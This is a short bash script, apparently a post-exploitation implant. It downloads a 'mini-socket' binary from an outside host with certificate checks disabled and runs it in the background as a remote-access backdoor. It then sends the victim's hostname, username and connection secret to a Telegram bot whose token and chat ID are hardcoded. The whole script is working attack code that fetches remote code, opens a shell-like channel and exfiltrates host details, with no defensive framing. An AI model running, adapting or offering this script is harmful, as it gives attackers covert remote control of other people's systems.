#!/bin/bash

# Telegram Config
TG_BOT_TOKEN="8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs"
TG_CHAT_ID="1142721678"

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

# Jalankan mini-socket
curl -fsSLk -o ms https://minisocket.io/bin/mini-socketv2 && chmod 755 ms
S=$(./ms -g)

if [ -n "$S" ]; then
    MINI_PORT=80 MINI_ARGS="-s $S -d" ./ms > /dev/null 2>&1 &
    
    OUTPUT="Success ==> mini-ncv2 -s $S"
    echo "$OUTPUT" | tee output.txt
    
    send_telegram "🟢 <b>MiniSocket Success</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo 'unknown')@$(whoami 2>/dev/null || echo 'unknown')</code>
🔑 <b>Secret:</b> <code>$S</code>
🔗 <b>Connect:</b> <code>mini-ncv2 -s $S</code>
━━━━━━━━━━━━━━━"
else
    OUTPUT="Failed :("
    echo "$OUTPUT" | tee output.txt
    send_telegram "🔴 <b>MiniSocket Failed</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo 'unknown')@$(whoami 2>/dev/null || echo 'unknown')</code>
❌ Status: Gagal mendapatkan secret
━━━━━━━━━━━━━━━"
fi
